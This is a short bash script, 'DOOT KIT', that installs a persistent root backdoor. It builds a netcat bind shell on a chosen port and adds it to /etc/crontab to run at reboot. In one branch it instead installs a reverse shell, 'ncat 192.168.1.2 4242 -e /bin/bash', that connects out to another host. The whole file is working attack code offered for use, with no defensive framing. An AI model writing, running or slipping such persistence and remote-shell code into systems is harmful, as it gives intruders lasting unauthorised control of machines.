#!/bin/bash

#         DOOT KIT
#        -========-
#   Run as root for an ez
#   netcat root backdoor.

# you can use any tcp socket to connect to the bind shell once its up,
# eg. if PORT=1234 and the ip of the machine is 123.123.123.123 ...
#   > netcat 123.123.123.123 1234


PORT='1234' # Change this to your desired port to bind to
ENVIORMENT='/bin/bash' # Change if you want, good to keep it to bash though

# Check for netcat installation on PATH
if ! command -v netcat &> /dev/null
then
  echo 'error: netcat not installed! aborting...'
  exit
fi

DOOT='netcat -lvp '$PORT' -e '$ENVIORMENT
echo '<+> Using Payload : '$DOOT

if ! command -v crontab &> /dev/null
then
  echo '<!> crontab command doesnt exist, writing payload to crontab directly...'
  echo "@reboot sleep 200 && "$DOOT >> /etc/crontab
else
  echo '<+> using crontab to add payload...'
  echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash" | crontab 2> /dev/null
fi

echo "finished. payload shout be written to crontab to run at reboot."
